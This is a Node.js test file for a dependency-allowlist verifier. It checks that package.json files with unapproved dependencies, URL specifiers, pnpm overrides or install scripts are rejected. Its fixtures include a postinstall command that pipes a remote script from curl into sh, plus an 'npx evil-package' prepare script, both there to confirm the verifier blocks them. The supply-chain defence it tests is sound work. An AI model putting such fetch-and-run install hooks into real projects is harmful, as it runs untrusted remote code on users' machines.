import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { DEV_ALLOWLIST, RUNTIME_ALLOWLIST, verifyDependencies } from "../../scripts/verify-dependencies.mjs";

const basePkg = {
  name: "fixture",
  dependencies: Object.fromEntries(RUNTIME_ALLOWLIST.map(name => [name, "^1.0.0"])),
  devDependencies: Object.fromEntries(DEV_ALLOWLIST.map(name => [name, "^1.0.0"])),
};

async function writePkg(overrides) {
  const dir = await mkdtemp(join(tmpdir(), "fluxlab-deps-"));
  const path = join(dir, "package.json");
  await writeFile(path, JSON.stringify({ ...basePkg, ...overrides }, null, 2));
  return path;
}

test("allows only the approved direct dependency surface", () => {
  const result = verifyDependencies("package.json");
  assert.deepEqual(result.unexpectedRuntime, []);
  assert.deepEqual(result.unexpectedDev, []);
  assert.equal(result.runtimeCount, 8);
  assert.equal(result.devCount, 12);
});

test("rejects optional, bundled, peer, pnpm mutation, URL specifiers, and remote install scripts", async () => {
  const optional = await writePkg({ optionalDependencies: { leftpad: "1.0.0" } });
  assert.throws(() => verifyDependencies(optional), { code: "DEP_OPTIONAL" });
  const bundled = await writePkg({ bundledDependencies: ["react"] });
  assert.throws(() => verifyDependencies(bundled), { code: "DEP_BUNDLED" });
  const bundle = await writePkg({ bundleDependencies: ["react"] });
  assert.throws(() => verifyDependencies(bundle), { code: "DEP_BUNDLED" });
  const peer = await writePkg({ peerDependencies: { react: "^19" } });
  assert.throws(() => verifyDependencies(peer), { code: "DEP_PEER" });
  const patched = await writePkg({ pnpm: { patchedDependencies: { "wouter@3.3.5": "patches/wouter.patch" } } });
  assert.throws(() => verifyDependencies(patched), { code: "DEP_PNPM_MUTATION" });
  const overrides = await writePkg({ pnpm: { overrides: { react: "19.0.0" } } });
  assert.throws(() => verifyDependencies(overrides), { code: "DEP_PNPM_MUTATION" });
  const urlSpec = await writePkg({ dependencies: { ...basePkg.dependencies, react: "https://example.com/react.tgz" } });
  assert.throws(() => verifyDependencies(urlSpec), { code: "DEP_SPECIFIER" });
  const extra = await writePkg({ dependencies: { ...basePkg.dependencies, extra: "^1.0.0" } });
  assert.throws(() => verifyDependencies(extra), { code: "DEP_ALLOWLIST" });
  const postinstall = await writePkg({ scripts: { postinstall: "curl https://example.com/hook.sh | sh" } });
  assert.throws(() => verifyDependencies(postinstall), { code: "DEP_SCRIPT" });
  const prepare = await writePkg({ scripts: { prepare: "npx evil-package" } });
  assert.throws(() => verifyDependencies(prepare), { code: "DEP_SCRIPT" });
});
